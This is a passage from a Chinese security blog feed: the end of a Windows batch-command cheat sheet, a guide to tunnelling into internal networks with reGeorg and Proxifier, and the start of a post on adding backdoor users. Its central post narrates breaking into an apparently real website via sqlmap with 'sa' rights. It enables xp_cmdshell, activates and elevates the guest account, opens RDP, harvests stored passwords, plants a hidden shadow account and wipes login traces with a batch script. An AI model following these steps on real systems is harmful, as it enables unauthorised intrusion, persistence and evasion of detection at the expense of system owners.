&quot;hkcu\software\microsoft\winmine&quot; /s </code></pre><h4 id="9-reg-restore将保存的子项和项写回到注册表"><a href="#9-reg-restore将保存的子项和项写回到注册表" class="headerlink" title="9.reg restore将保存的子项和项写回到注册表"></a><strong>9.reg restore将保存的子项和项写回到注册表</strong></h4><pre><code class="hljs">reg restore KeyName FileName</code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">FileName 指定将写回到注册表中的文件的名称和路径。必须使用带 .hiv 扩展名的 reg save 操作预先创建该文件。</code></pre><p><strong>实例：</strong></p><pre><code class="hljs">　reg restore &quot;hkcu\software\microsoft\winmine&quot; wmbkup.hiv 　</code></pre><h4 id="10-reg-save将指定的子项、项和注册表值的副本保存到指定文件中。"><a href="#10-reg-save将指定的子项、项和注册表值的副本保存到指定文件中。" class="headerlink" title="10.reg save将指定的子项、项和注册表值的副本保存到指定文件中。"></a><strong>10.reg save将指定的子项、项和注册表值的副本保存到指定文件中。</strong></h4><pre><code class="hljs">reg save KeyName FileName </code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">FileName 指定所创建的文件的名称和路径。如果未指定路径，则使用当前路径。 </code></pre><p><strong>实例：</strong></p><pre><code class="hljs">reg save &quot;hkcu\software\microsoft\winmine&quot; wmbkup.hiv </code></pre><h4 id="11-reg-unload-使用-reg-load-操作删除已加载的部分注册表"><a href="#11-reg-unload-使用-reg-load-操作删除已加载的部分注册表" class="headerlink" title="11.reg unload 使用 reg load 操作删除已加载的部分注册表"></a><strong>11.reg unload 使用 reg load 操作删除已加载的部分注册表</strong></h4><pre><code class="hljs">reg unload KeyName </code></pre><p><strong>实例：</strong></p><pre><code class="hljs">reg unload &quot;hkcu\software\microsoft\winminebk2&quot;</code></pre><p><strong>补充：</strong></p><p><strong>1.注册表的常用位置</strong></p><p><strong>a.系统启动项：</strong>                 </p><pre><code class="hljs">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]         [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</code></pre><p>example: </p><pre><code class="hljs">    REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v VNC_Server /t REG_SZ /d &quot;%cd%\VNC_Server.bat&quot; /f</code></pre><p><strong>b.系统环境变量：</strong>         </p><pre><code class="hljs">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment]   </code></pre><p>c.当前用户的环境变量：         </p><pre><code class="hljs">[HKEY_CURRENT_USER\Environment]   </code></pre><p>2.修改注册表之后，结束并重新加载explorer.exe进程，可刷新注册表，令其生效</p><pre><code class="hljs">taskkill /f /im explorer.exe &gt;nul start &quot;&quot; &quot;explorer.exe&quot;</code></pre><h3 id="2-系统服务"><a href="#2-系统服务" class="headerlink" title="2.系统服务"></a><strong>2.系统服务</strong></h3><p><strong>1）停止&#x2F;启动服务</strong></p><p>停止：NET STOP 服务名<br>启动：NET START 服务名</p><p>2）设置启动类型：</p><p>自动：  SC CONFIG 服务名 START&#x3D; auto<br>手动：  SC CONFIG 服务名 START&#x3D; demand<br>已禁用：SC CONFIG 服务名 START&#x3D; disabled   </p><p><strong>注：“START&#x3D; ”等号后面必须要有一个空格。(start还有boot,system两个值)</strong>       </p><p>Sample:  </p><pre><code class="hljs">SC CONFIG Spooler START= demand (打印机加载项，设置成手动，默认自动)</code></pre><p>3）查看系统服务</p><pre><code class="hljs">start %SystemRoot%\system32\services.msc /s </code></pre><h3 id="3-文件-目录操作"><a href="#3-文件-目录操作" class="headerlink" title="3.文件&#x2F;目录操作"></a><strong>3.文件&#x2F;目录操作</strong></h3><p>这里要注意一点，在windows下，目录和文件并不是一个概念，注意和linux系统的区分</p><p><strong>1.del 文件删除</strong></p><pre><code class="hljs">DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names</code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">/P 删除每一个文件之前提示确认。/F 强制删除只读文件。/S 删除所有子目录中的指定的文件 /Q 安静模式。删除全局通配符时，不要求确认</code></pre><p>实例：</p><p>1.将直接删除d:\test\a.bat，没有任务提示</p><pre><code class="hljs">del /s /q /f d:\test\a.bat </code></pre><p>2.将直接删除 本目录的 temp 目录的所有文件，没有任务提示 </p><pre><code class="hljs"> del temp\* /q /f /s </code></pre><p><strong>2.rmdir 目录删除</strong></p><pre><code class="hljs">RMDIR [/S] [/Q] [drive:]pathRD [/S] [/Q] [drive:]path</code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">/S 除目录本身外，还将删除指定目录下的所有子目录和文件。用于删除目录树。/Q 安静模式，带 /S 删除目录树时不要求确认</code></pre><p><strong>注意：在不加任何参数时，rd命令只能删除空的文件夹。</strong></p><p><strong>实例：</strong></p><p>1.如果文件夹123不为空，则通过&#x2F;S参数，可删除文件夹123<br>rd &#x2F;s d:\123</p><p>2.此时通过&#x2F;Q参数可以使其不用询问而直接删除。</p><p>rd &#x2F;s &#x2F;q d:\123</p><p><strong>3.fc 文件比较</strong></p><p>比较两个文件或两个文件集并显示它们之间的不同</p><pre><code class="hljs">FC [/A] [/C] [/L] [/LBn] [/N] [/OFF[LINE]] [/T] [/U] [/W] [/nnnn][drive1:][path1]filename1 [drive2:][path2]filename2FC /B [drive1:][path1]filename1 [drive2:][path2]filename2​  /A         只显示每个不同处的第一行和最后一行。  /B         执行二进制比较。  /C         不分大小写。  /L         将文件作为 ASCII 文字比较。  /LBn       将连续不匹配的最大值设置为指定             的行数。  /N         在 ASCII 比较上显示行数。  /OFF[LINE] 不要跳过带有脱机属性集的文件。  /T         不要将制表符扩充到空格。  /U         将文件作为 UNICODE 文本文件比较。  /W         为了比较而压缩空白(制表符和空格)。  /nnnn      指定不匹配处后必须连续             匹配的行数。  [drive1:][path1]filename1             指定要比较的第一个文件或第一个文件集。  [drive2:][path2]filename2             指定要比较的第二个文件或第二个文件集。</code></pre><p><strong>4.move 移动文件</strong></p><p>移动文件并重命名文件和目录。</p><pre><code class="hljs">MOVE [/Y | /-Y] [drive:][path]dirname1 dirname2</code></pre><p><strong>参数解释:</strong>   ​</p><p>&#x2F;Y 取消重命名提示</p><p>1.重命名文件</p><pre><code class="hljs">move d:\abc d:\abcd</code></pre><p><strong>注意：</strong><br>1.move 不能跨分区移动文件夹<br>2.不能够识别出带隐藏或系统属性的文件（可以使用 attrib命令去掉这些文件的隐藏或系统属性，再来move）</p><p><strong>5.attrib 显示或更改文件属性</strong></p><pre><code class="hljs">ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+P | -P] [+U | -U][drive:][path][filename] [/S [/D]] [/L]         +   设置属性。  -   清除属性。  R   只读文件属性。  A   归档文件属性。  S   系统文件属性。  H   隐藏文件属性。  O   脱机属性。  I   没有内容索引的文件属性。  X   没有擦除文件属性。  V   完整性属性。  P   钉住属性。  U   未被钉扎的属性。  [drive:][path][filename]      指定要处理的ATTILB文件或文件。  /S  在当前文件夹中匹配文件的进程以及所有子文件夹。  /D  处理文件夹也是如此  /L  对符号链接的属性与符号链接的目标进行工作  </code></pre><p><strong>6.md 创建文件夹</strong></p><p>1.如果创建的文件夹有空格，那么需要用引号括起来</p><p><strong>例如：</strong></p><pre><code class="hljs">md &quot;d:\my game&quot;</code></pre><p>2.同时创建多个目录</p><pre><code class="hljs">md [路径\]目录1 [路径\]目录2 [路径\]目录3……</code></pre><p><strong>实例：</strong></p><p>在当前目录下建立abc和abcd两个文件,同时D:\gmae下也建立一个文件夹123。  </p><pre><code class="hljs">md abc D:\gmae\123 abcd</code></pre><p>3.创建多级目录</p><pre><code class="hljs">md [路径\]目录1\目录2\目录3\…</code></pre><p>实例：</p><pre><code class="hljs">md d:\abc\abcd\abcde</code></pre><p><strong>7.递归查找指定文件</strong></p><p>SearchFile.bat</p><pre><code class="hljs">@echo offsetlocal enabledelayedexpansion    if &quot;%1&quot; equ &quot;&quot; (    echo 作用: 递归搜索文件名中含有 关键字 的文件，并列出文件的绝对路径     ::   上角标符号 ^ 是转义字符，用于输出尖括号    echo 用法: searchFile ^&lt;关键字^&gt; ^&lt;搜索路径^&gt;    goto end)if &quot;%2&quot; equ &quot;&quot; (    echo 作用: 递归搜索文件名中含有 关键字 的文件，并列出文件的绝对路径     ::   上角标符号 ^ 是转义字符，用于输出尖括号    echo 用法: searchFile ^&lt;关键字^&gt; ^&lt;搜索路径^&gt;    goto end)echo 开始搜索文件，请等待程序提示“搜索完成”再退出...    echo.    echo 搜索结果: &gt; result.txtfor /r %2 /d %%i in (.) do (        dir %%i 2&gt;nul | find /i &quot;%1&quot; | find /v &quot;目录&quot;    if !errorlevel! equ 0 (    ::此处使用感叹号 ！            echo  上述文件位置 %%i        echo -------------------------------------------        echo %%i &gt;&gt; result.txt    )    )    echo.    echo 搜索完成！回车可退出    pause &gt;nul :endpause</code></pre><p><strong>8.隐藏某目录的所有文件及文件夹</strong></p><pre><code class="hljs">cd /d 要隐藏的目录(如：D:)      for /f &quot;usebackq delims=&quot; %%A in (`dir /a /b`) do (attrib &quot;%%A&quot; -r +h -s) </code></pre><p><strong>9.批处理中使用密码</strong></p><p>这个操作可以针对将bat文件转换成exe文件的时候使用，防止未授权操作</p><p>security.bat</p><pre><code class="hljs"> @echo off       set num=0       :11       set /p pass=请输入密码:       if &quot;%pass%&quot;==&quot;admin&quot; goto next1              set /a num=%num% + 1       if %num%==3 goto no1       goto 11       :no1                 %windir%\system32\rundll32.exe     user32.dll,LockWorkStation       goto 11       :next1       echo 密码正确，执行下面的程式               pause </code></pre><p><strong>10.清除3389的登录记录</strong></p><pre><code class="hljs">@echo off@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a@exit </code></pre><p>11.清理 IE 等日志信息</p><pre><code class="hljs">@echo offcolor 0amode con cols=100 lines=350echo %date% %time%set time1=%time::=%set file=%time1:~,8%echo 即将进行清理，请先关闭浏览器set /p=&lt;nul 1&gt;cls%file%.log 2&gt;clsErr%file%.logset /p a=你确定继续清理吗？（Y/N）if /i  not &quot;%a%&quot;==&quot;y&quot; goto :endecho 清理中，请稍后。。。echo ------------------------------------开始清理：%temp%\*.*&gt;&gt;cls%file%.logdel /f /s /q %temp%\*.* &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logdel /f /s /q &quot;%userprofile%\locals~1\tempor~1\*.*&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logdel /f /s /q &quot;%systemdirve%\recycled\*.*&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logdel /f /s /q &quot;%userprofile%\recent\*.*&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logdel /f /s /q &quot;%userprofile%\cookies\*.*&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logdel /f /s /q &quot;%userprofile%\locals~1\history\*.*&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logecho ------------------------------------开始清理：注册表信息&gt;&gt;cls%file%.logecho y | reg delete &quot;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\TypedURLS&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logecho y | reg delete &quot;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\internet settings\5.0\cache\extensible cache&quot; &gt;&gt;cls%file%.log 2&gt;&gt;clsErr%file%.logecho 清理完毕，按任意键退出:endpause</code></pre>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows 批处理 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置reGeorg+Proxifier渗透内网</title>
    <link href="/2018/07/06/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8reGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/"/>
    <url>/2018/07/06/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8reGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>渗透测试中难免会遇到外部服务器有两块网卡，一块连接着外网另一块连接着内网。既然有内网，我们肯定不能放过，因为内网始终都是安全隐患最大的地方，管理员最容易在内网的服务器上掉以轻心，但是我们总不能始终用这台服务器去访问内网，毕竟服务器上什么必要的工具都没有，我们最好是能以这台服务器为跳板，把这台服务器作为我们访问内网的代理，然后用自己的主机进行操作，本文就是简单的介绍一下如何实现挂内网代理的。</p><span id="more"></span><h2 id="0X02-工具"><a href="#0X02-工具" class="headerlink" title="0X02 工具"></a><strong>0X02 工具</strong></h2><p>1.reGeorg（github的开源项目）<br>2.Proxifier<br>因为我是windows主机所以我就先介绍一下使用图形化工具Proxifier配合reGeorg实现挂内网代理的。(Proxifier 这个工具在MacOS上也有，不过如果你习惯于使用命令行，那我还是推荐你使用 proxychains+reGeorg，本文就不再介绍)</p><h2 id="0X03-使用"><a href="#0X03-使用" class="headerlink" title="0X03 使用"></a><strong>0X03 使用</strong></h2><h3 id="配置-reGeorg"><a href="#配置-reGeorg" class="headerlink" title="配置 reGeorg"></a><strong>配置 reGeorg</strong></h3><p>首先我们拿到这个网站就是将reGeorg 中的 tunnel.xxx 这个文件(后缀名根据，网站使用的语言而定)放在web目录（只要可以解析就行，不一定是web目录），这个名字是可以改的，改成一个比较隐蔽的名字就可以了。</p><p>然后运行 reGeorgSocksProxy.py 这个py脚本，命令格式是：</p><pre><code class="hljs">$ python reGeorgSocksProxy.py -p xxxx -u http://:www.xxx.com/xxx/xxx/tunnel.xxx</code></pre><p>这个端口就是你所使用的本地代理端口，待会我们将使用 Proxifier这个工具进行全局的代理，将你指定的任何软件的流量代理到你本地的 xxxx端口，然后我们的流量就会经过刚刚的脚本文件到了内网的服务器，我们就可以访问内网了。（有些端口可能会不成功，这是随着不同的主机定的，推荐使用8080 或者 8808）</p><p>如果我们这个脚本成功运行，你就会看到如下的图像：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%861.png" alt="此处输入图片的描述"></p><h3 id="配置-Proxifier"><a href="#配置-Proxifier" class="headerlink" title="配置 Proxifier"></a><strong>配置 Proxifier</strong></h3><p>不得不说这个工具是一个神器，他能真正的实现全局的代理，你系统得每一个访问他都能代理，不仅如此，他还可以自己选择想要代理的任何软件，非常的方便，于是他也就成了windows下代理的神兵利器。</p><p>我们来看一下他的真实面目：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%862.png" alt="此处输入图片的描述"></p><h4 id="配置开始："><a href="#配置开始：" class="headerlink" title="配置开始："></a><strong>配置开始：</strong></h4><p><strong>1.首先我们配置代理服务器（这里就是我们的本机）：</strong></p><p>我们找到左上角菜单栏的第二个选项profile ，点开找到第一个选项 Proxy Server 点开就会弹出下面的对话框，然后你就按照你之前使用 reGeorg 的使用选定的端口进行配置，这里我选择的是8808。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%863.png" alt="此处输入图片的描述"></p><p><strong>2.配置需要代理的软件</strong></p><p>这里我不推荐实现全局代理，我个人认为没有必要也不能达到最佳的性能，当然最重要的是非常的不方便，我们很多软件由于代理到内网都没法连接外网，于是就不能使用了。</p><p>我这里只讲如何实现选择软件代理</p><p>**（1）**我们点开左上角第二个profile选项，选择Proxification Rules,就会看到如下的窗口：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%864.png" alt="此处输入图片的描述"></p><p>**（2）**我们将默认模式设置为不走代理的直接连接，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%865.png" alt="此处输入图片的描述"></p><p>**（3）**我们选择需要代理的软件：</p><p>名字当然随便取，浏览就是在目录里选中自己需要代理的软件就行了，如下图<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%866.png" alt="此处输入图片的描述"></p><p>选择好以后，我们回到刚刚的页面，然后在自己添加的软件的右边的下拉菜单中选择自己配置的代理，以及打上前面的复选框的勾</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%90%867.png" alt="此处输入图片的描述"></p><p><strong>好了现在代理应该是能够正常访问了，可以在你选择的软件里面大干一番了！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 渗透测试 内网代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次利用sqlmap渗透的经历</title>
    <link href="/2018/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8sqlmap%E6%B8%97%E9%80%8F%E7%9A%84%E7%BB%8F%E5%8E%86/"/>
    <url>/2018/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8sqlmap%E6%B8%97%E9%80%8F%E7%9A%84%E7%BB%8F%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>平时打CTF比较多，CTF都是一些挖洞的花式技巧，但是对于渗透测试这种针对业务，目标明确的（拿站）这种活干的还是比较少，也相对经验缺乏，但是由于暑假要去某司干渗透测试相关的活，所以就自己先研究了起来，也认识了一些渗透比较牛逼的大师傅，下面简单的记录一下渗透的一个比较容易的站。</p><h2 id="0X01开始"><a href="#0X01开始" class="headerlink" title="0X01开始"></a><strong>0X01开始</strong></h2><p>找一个小一点的asp的站，一般渗透都是从注入开始吧，毕竟现在还是OWASP榜首，一开始就找到一个注入，如果说CTF平时习惯用手测，考察的是疯狂的花式绕过，那么渗透就相对简单一些，直接上sqlmap 这个神器就行了，一般asp的站都是windows的主机，使用的sql也一般是access或者是Sql server,使用的时候跟上 –current-user 这个参数就能看到我们注入点当前的权限，如下图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F1.png" alt="此处输入图片的描述"></p><span id="more"></span><p>我很幸运的看到 ‘sa’ ，说明我是超级管理员权限了，而且我们也能看到，我已经看到了服务器使用的是 windows 2008 R2 ,服务用的是 IIS 以及 SQL server 2008 。</p><p>因为一般windows的服务器由于命令行的不好用，很多都是使用3389来进行管理的，于是接着我又对这个网站的端口进行了一番探测，发现果然开了3389，那么渗透测思路就很明确了，先定一个小目标：我需要登录3389。</p><h2 id="0X02深入"><a href="#0X02深入" class="headerlink" title="0X02深入"></a><strong>0X02深入</strong></h2><p>有了这个小目标以后，有种思路就是通过注入得到管理员的密码，说不定就是3389的密码。后来师傅们又提醒我，干嘛要注入，你都是 sa权限了，直接给他创建一个用户然后登陆进去不就得了？</p><p>我这时候才意识都sqlmap的强大，是在下无知了，我先试了 –sql-shell 这个参数，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F2.png" alt="此处输入图片的描述"></p><p>我可以直接在里面执行sql命令，后来我一想，有没有能直接执行系统命令的，你别说还真有…..智商再次受到碾压。我们用sql 打开 xpcmdshell</p><p><strong>打开</strong></p><pre><code class="hljs">sp_configure &#39;show advanced options&#39;,1reconfiguregosp_configure &#39;xp_cmdshell&#39;,1reconfiguregoiubi </code></pre><p><strong>执行结果：</strong></p><p>配置选项 ‘show advanced options’ 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。<br>配置选项 ‘xp_cmdshell’ 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。</p><p>如需关闭只需将“sp_configure ‘xp_cmdshell’,1”改为“sp_configure ‘xp_cmdshell’,0”即可。</p><p>然后接着使用–os-shell 就行了，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F3.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F4.png" alt="此处输入图片的描述"></p><p><strong>2018.3.11 增——————————–</strong></p><p>如果要问 sqlmap os-shell 执行命令的原理是什么，那么我们在执行的时候可以稍微观察一下 info 的细节，就能看到这样的结果</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9519.jpg" alt="此处输入图片的描述"></p><p>如果对 UDF 是什么还不了解的话，可以看一下我的<a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">这一篇文章</a></p><p>习惯性的输入 dir 看一下目录：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%955.png" alt="此处输入图片的描述"></p><p>发现这个注入点是没有输出的，那不管了，我先创建一个账号试一下，如果登进去不就是执行了？（为了不打草惊蛇，我选择了激活系统自带的guest用户）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%956.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%957.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%958.png" alt="此处输入图片的描述"></p><p>开启3389，登录！</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%959.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F_10.png" alt="此处输入图片的描述"></p><p>成功了，hhh，sa 权限不是盖的</p><h2 id="0X03挖掘"><a href="#0X03挖掘" class="headerlink" title="0X03挖掘"></a><strong>0X03挖掘</strong></h2><p>进去了以后可以干什么呢？信息收集呗，看看网络情况和主机情况。</p><p><strong>网络：</strong><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9512.png" alt="此处输入图片的描述"></p><p>很遗憾只有一块外网的网卡，没有内网，本来还研究一下内网的。</p><p><strong>主机：</strong><br>主机我都无法吐槽，这种管理员就应该去祭天。。。真的把啥都给我了。。（不过我后来发现管理员在服务器上备份账号密码还真不是一个非常少见的是事，只不过这位管理员直接在外网服务器上备份还真的是nb）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9511.png" alt="此处输入图片的描述"></p><p>随后我又探测了一些其他的网络情况：</p><p><strong>arp -a</strong> </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F13_.png" alt="此处输入图片的描述"></p><p><strong>hosts</strong> </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9514.png" alt="此处输入图片的描述"></p><p><strong>systeminfo</strong><br>这个信息不知道为啥看不到，是不是我是guest 的原因，但是我已经把我添加到了管理员组，不是很理解。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9515.png" alt="此处输入图片的描述"></p><p>总之也没发现什么特别有价值的东西，那个arp -a 发现的另一个ip 是同一个ip端下的另一个不同的网站，和这个网站的关系不是特别大，（不过那些用户名密码真的是….）</p><h2 id="0X04隐藏"><a href="#0X04隐藏" class="headerlink" title="0X04隐藏"></a><strong>0X04隐藏</strong></h2><p>我现在是guest用户，这个是windows的一个默认的用户，他是不能删除的，只能禁用，这个账户我是不能留的太容易被发现了，还是创建一个影子账户比较好（具体操作请看<a href="http://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">windows渗透中后门用户的添加方法探究 </a>）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9519.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9520.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9521.png" alt="此处输入图片的描述"></p><p>最后就是把自己登陆3389的痕迹清除</p><p>弄一个bat运行一下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9517.png" alt="此处输入图片的描述"></p><p>然后删除</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9518.png" alt="此处输入图片的描述"></p><p>最后别忘了从回收站里面删除这个文件。</p><p>溜了溜了。。。。期末要紧，毕业要紧。。。。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 渗透测试 sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows渗透中后门用户的添加方法探究</title>
    <link href="/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/"/>
    <url>/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>渗透中如何维持administrator权限，我想最简单的方法就是添加一个用户了吧，最好这个用户你添加了管理员还看不到，那就美滋滋了。正好最近在windows渗透过程中遇到了这个问题，就把几种常见的方式拿出来对比一下，供大家参考。<br><strong>ps:实验环境windows server 2008 R2 ,VMware</strong></p><span id="more"></span><h2 id="0X01-基础：激活Guest用户"><a href="#0X01-基础：激活Guest用户" class="headerlink" title="0X01 基础：激活Guest用户"></a><strong>0X01 基础：激活Guest用户</strong></h2><p>我们知道windows中有一个非常特殊的用户叫做Guest,他特殊就特殊在他是一个内置账户，平时一直都处于禁用状态，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%282%29.png" alt="此处输入图片的描述"></p><p>这是我新安装的虚拟机的初始状态，可以看到已经禁用了，而且禁用的账户在图标上也有一个黑色的小箭头作为标识。</p><p>那么我们的思路就是既然这个账户已经存在了，我们就可以直接激活他，并给他设置一个账号密码，再把他弄到administrators里面就行了。</p><p>我们首先激活，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%283%29.png" alt="此处输入图片的描述"></p><p>可以看到我首先试了一下能不能激活别的用户，很明显结果是不行的，说明原先不存在的用户是不能激活的，必须要首先创建，然后我激活Guest用户成功，左边的红框已经说明了账户禁用取消。</p><p>接下来就是依次输入下面的命令完成设置密码和加入管理组的目的:</p><pre><code class="hljs">net user guest xxxx net loaclgroup administrators guest /add</code></pre><p>到这里其实已经大功告成了，我们退出去看一下效果：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%284%29.png" alt="此处输入图片的描述"></p><p>我只能说wo_ri，居然看的清清楚楚guest用户上线了…… 仿佛在给管理员明确的暗示你已经进来了，我们知道，如果用户被禁用，在登录界面是看不出来的看到的只会是下面这样：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%281%29.png" alt="此处输入图片的描述"></p><p>而且我们已经很明显的将计算机管理中的Guest的图标给改了，那个小的黑色的箭头已经不见了，如果管理员细心的话也能很快发现，所以，这种方法只适用于管理员登陆使用的是命令行，或者3389登录的时候选择了用户，并且还没有打开计算机管理看看Guest有没有被激活否则就是被安排的明明白白。</p><h2 id="0X02-进阶：创建“隐藏”用户"><a href="#0X02-进阶：创建“隐藏”用户" class="headerlink" title="0X02 进阶：创建“隐藏”用户"></a><strong>0X02 进阶：创建“隐藏”用户</strong></h2><p>很多人也许看到上面的方法就要说了，我们不会那么傻的，我们也听说过有一种隐形账户，类似于admin$这样的，这样网上说管理员就看不到了，是不是这样呢？我们我也特地试验了一下。</p><p>首先，我们创建 admin$用户如下：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%289%29.png" alt="此处输入图片的描述"></p><p>然后别忘了将其加入管理组</p><pre><code class="hljs">net loaclgroup administrators admin$ 